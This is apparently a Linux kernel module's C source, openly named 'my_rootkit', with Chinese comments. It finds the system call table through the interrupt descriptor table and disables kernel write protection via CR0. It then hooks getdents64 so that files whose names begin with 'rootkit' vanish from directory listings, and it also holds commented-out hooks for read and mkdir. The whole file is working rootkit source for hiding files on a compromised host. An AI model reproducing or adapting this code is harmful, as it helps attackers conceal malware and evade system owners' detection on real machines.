#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/dirent.h> 
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/syscalls.h> 
//flags e.g. O_RDWR , O_EXCL
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
//get_ds() set_fs() get_fs()
#include <asm/processor.h>
#include <asm/uaccess.h>

#include "my_rootkit.h"

#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 0)
#define LINUX26
#endif
#ifdef LINUX26
/*code in 3.2 kernel*/
//#define __NR_read 3//63
struct idt {
	unsigned short limit;
	unsigned long base;
}__attribute__((packed));

struct idt_descriptor {
	unsigned short off_low;
	unsigned short sel;
	unsigned char none, flags;
	unsigned short off_high;
} __attribute__((packed));

void **sys_call_table;
asmlinkage ssize_t (*original_read)(unsigned int, char *, size_t);
asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
unsigned int original_mkdir;

void* get_system_call(void)
{
	struct idt idtr;
	struct idt_descriptor desc;
	
	asm ("sidt %0":"=m"(idtr));
	memcpy(&desc, (void*)(idtr.base+(0x80*8)), sizeof(desc));
	return ((void*)((desc.off_high<<16) | desc.off_low));
}
void* get_sys_call_table(void* system_call)
{
	unsigned char *p;
	unsigned long s_c_t;
	int count = 0;
	
	//my_rootkit_debug(KERN_DEBUG "Here I am: %s:%i\n", __FILE__, __LINE__);
	p = (unsigned char *)system_call;
	while (!((*p==0xff)&&(*(p+1)==0x14)&&(*(p+2)==0x85))) {
		//my_rootkit_debug(KERN_ALERT "p = 0x%x, count=%d\n", (unsigned int)p, count);
		p++;
		if (count++ > 100) {
			count = -1;
			break;
		}
	}
	if (count != -1) {
		p += 3;
		s_c_t = *((unsigned long*)p);
	}
	else s_c_t = 0;
	return ((void*)s_c_t);
}

void setback_cr0(unsigned int val)
{
    asm volatile("movl %%eax, %%cr0"
               :
               : "a"(val)
               );
}
 
unsigned int clear_cr0_save(void)
{
	unsigned int cr0 = 0;
	unsigned int ret;
	__asm__ __volatile__ ("movl %%cr0, %%eax":"=a"(cr0));
	ret = cr0;

	cr0 &= 0xfffeffff;
	asm volatile ("movl %%eax, %%cr0":: "a"(cr0));
	return ret;
}

asmlinkage long my_rootkit_mkdir(const char *name,int mod)
{
	printk(KERN_ALERT"mkdir call is intercepted\n");
	return 0;
}

asmlinkage ssize_t my_rootkit_read(int fd, char *buf, size_t count)
{
	ssize_t ret;
	static int i = 0;
	if (i == 0) {
		i = 1;
		my_rootkit_debug(KERN_ALERT "This is in my read\n");
	}
	ret = (*original_read)(fd, buf, count);
	return ret;
}

asmlinkage long my_rootkit_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) 
{ 
	unsigned int bufLength, recordLength, modifyBufLength;
	struct linux_dirent64 *dirp2, *dirp3,
	*head = NULL, 				//进行修改时，指向正确的列表的头条记录
	*prev = NULL; 				//进行修改时，指向列表中上一项记录
	char hide_file[]="rootkit"; //要隐藏的文件名字
	
	//my_rootkit_debug(KERN_ALERT "This is in my getdents64\n");
	
	bufLength = (*original_getdents64)(fd, dirp, count); //调用原本函数得到文件夹信息
	//my_rootkit_debug(KERN_ALERT "bufLength:%u\n", bufLength);
	if (bufLength <= 0) return bufLength ; //如果函数调用出错，直接返回好了
	
	//申请内核空间
	dirp2 = (struct linux_dirent64 *)kmalloc(bufLength, GFP_KERNEL);
	if (!dirp2) return bufLength;
	
	//把已经得到的文件夹信息从用户空间复制出来
	if (copy_from_user(dirp2, dirp, bufLength))
	{
		//my_rootkit_debug(KERN_ALERT "fail to copy dirp to dirp2 \n");
		return bufLength;
	}

	head = dirp2;
	dirp3 = dirp2;
	modifyBufLength = bufLength;
	while (((unsigned long)dirp3) < (((unsigned long)dirp2) + bufLength))
	{      
		recordLength = dirp3->d_reclen;
		//my_rootkit_debug(KERN_ALERT "length:%u ",recordLength); 

		if (recordLength == 0)
		{
			//有些文件系统getdents函数没能正确运行 
			break;
		}
		// 是否是我们要隐藏的文件 
		//my_rootkit_debug(KERN_ALERT "file_name=%s\n", dirp3->d_name);
		if (strncmp(dirp3->d_name, hide_file, strlen(hide_file)) == 0)
		{        
			if (!prev) //整个列表中的第一个记录就是我们要隐藏的文件
			{
				head = (struct linux_dirent64 *)((char *)dirp3 + recordLength);
				modifyBufLength -= recordLength;
			}
			else{ // 修改前一个记录长度，去掉我们要隐藏的文件纪录 
				prev->d_reclen += recordLength;
				memset(dirp3, 0, recordLength);
			}
		}
		else {
			prev = dirp3;
		}
		//继续下一条记录查找
		dirp3 = (struct linux_dirent64 *)((char*)dirp3 + recordLength);
	}

	// 用我们修改后的文件信息覆盖原有用户空间的文件信息 
	copy_to_user(dirp, head, modifyBufLength);
	kfree(dirp2);
	
	return modifyBufLength;
}

struct proc_dir_entry * my_rootkit_dir;
struct proc_dir_entry * my_rootkit_files;
ino_t my_rootkit_ino;
#define DMODE S_IFDIR|S_IRUGO|S_IXUGO
#define FMODE S_IFREG|S_IRUGO
//Initialize the module
/*
#define KERN_EMERG    "<0>"    // system is unusable 
#define KERN_ALERT    "<1>"    // action must be taken immediately 
#define KERN_CRIT     "<2>"    // critical conditions 
#define KERN_ERR      "<3>"    // error conditions 
#define KERN_WARNING  "<4>"    // warning conditions 
#define KERN_NOTICE   "<5>"    // normal but significant 
#define KERN_INFO     "<6>"    // informational 
#define KERN_DEBUG    "<7>"    // debug-level messages 
*/
int my_rootkit_init(void)
{
	void *system_call;
	unsigned int cr0;
	
	my_rootkit_debug(KERN_ALERT "Begin in init_module\n");
#if 0
	my_rootkit_dir = create_proc_entry(MODULE_NAME, DMODE, &proc_root);
    if(my_rootkit_dir == 0x0) {
		my_rootkit_debug(KERN_ALERT "create my_rootkit_dir\n");
		return EINVAL;
	}
    my_rootkit_ino = my_rootkit_dir->low_ino;
	
	my_rootkit_files = create_proc_entry("files", FMODE, my_rootkit_dir);
    if(my_rootkit_files == 0x0) {
		my_rootkit_debug(KERN_ALERT "create my_rootkit_files\n");
		return EINVAL;
	}
    //my_rootkit_files->read_proc = my_rootkit_read_files;
#endif
	system_call = get_system_call();
	//my_rootkit_debug(KERN_ALERT "Address of system_call: 0x%x\n", (unsigned int)system_call);
	
	sys_call_table = (void**)get_sys_call_table(system_call);
	if (sys_call_table == 0) {
		my_rootkit_debug(KERN_DEBUG "Failed to get sys_call_table\n");
		return 0;
	}
	//my_rootkit_debug(KERN_ALERT "Address of sys_call_table: 0x%x\n", (unsigned int)sys_call_table);
	//my_rootkit_debug(KERN_ALERT "__NR_read=%d, 0x%x\n", __NR_read, (unsigned int)(sys_call_table+__NR_read));
	//my_rootkit_debug(KERN_ALERT "address = 0x%0x\n", (unsigned int)*(sys_call_table+__NR_read));
 
	//original_read = sys_call_table[__NR_read];
	original_getdents64 = sys_call_table[__NR_getdents64];
	//original_mkdir = (unsigned int)sys_call_table[__NR_mkdir];
	
	cr0 = clear_cr0_save();
	//sys_call_table[__NR_mkdir] = (void*)&my_rootkit_mkdir;
	//sys_call_table[__NR_read] = (void*)&my_rootkit_read;
	sys_call_table[__NR_getdents64] = my_rootkit_getdents64;	
	setback_cr0(cr0);
	
	//my_rootkit_debug(KERN_ALERT "address = 0x%0x\n", (unsigned int)*(sys_call_table+__NR_read));
	my_rootkit_debug(KERN_ALERT "End in init_module\n");
	return 0;
}
//Exit the module
void my_rootkit_exit(void)
{
	unsigned int cr0;
	my_rootkit_debug(KERN_ALERT "Begin in cleanup_module\n");

	cr0 = clear_cr0_save();
	//sys_call_table[__NR_read] = original_read;
	//sys_call_table[__NR_mkdir] = (void*)original_mkdir;
	if(sys_call_table && sys_call_table[__NR_getdents64] == my_rootkit_getdents64)
		sys_call_table[__NR_getdents64] = original_getdents64;  
	setback_cr0(cr0);
	//my_rootkit_debug(KERN_ALERT "address = 0x%0x\n", (unsigned int)*(sys_call_table+__NR_read));
	my_rootkit_debug(KERN_ALERT "End in cleanup_module\n");
}
MODULE_AUTHOR("ChHuWaLi");
MODULE_LICENSE("Dual BSD/GPL");
module_init(my_rootkit_init);
module_exit(my_rootkit_exit);
#else
/*code in 2.4 kernel */
#endif
